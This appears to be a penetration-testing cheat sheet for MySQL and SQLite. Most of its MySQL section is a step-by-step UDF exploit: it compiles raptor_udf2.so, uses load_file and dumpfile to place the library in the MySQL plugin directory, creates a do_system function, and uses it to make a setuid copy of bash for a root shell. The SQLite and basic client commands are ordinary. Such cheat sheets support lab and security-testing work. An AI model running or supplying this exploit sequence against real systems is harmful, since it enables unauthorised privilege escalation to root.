# MySQL Server

```bash
# Install MySQL client tool
sudo apt install default-mysql-client

# Conect to database server
mysql -h TARGET-HOST -u root -p

# Gather version of MySQL and OS
mysql> select version();

# List all databases
mysql> show databases;
```

### User-Defined Function MySQL 4.x/5.0 Exploit

[MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library](https://www.exploit-db.com/exploits/1518)

```bash
# Compile exploit library
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Access MySQL
mysql -u root -p

# Exploiting
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
mysql> \q

# Gain root
/tmp/rootbash -p
```

# SQLite3

```bash
# Install SQLite client tool
sudo apt install sqlite3

# Open database
sqlite3 database-in-a-file.db

# Show tables
sqlite> .tables

# Show columns info
sqlite> PRAGMA table_info(my_table);

# List registers
sqlite> SELECT * FROM my_table;
```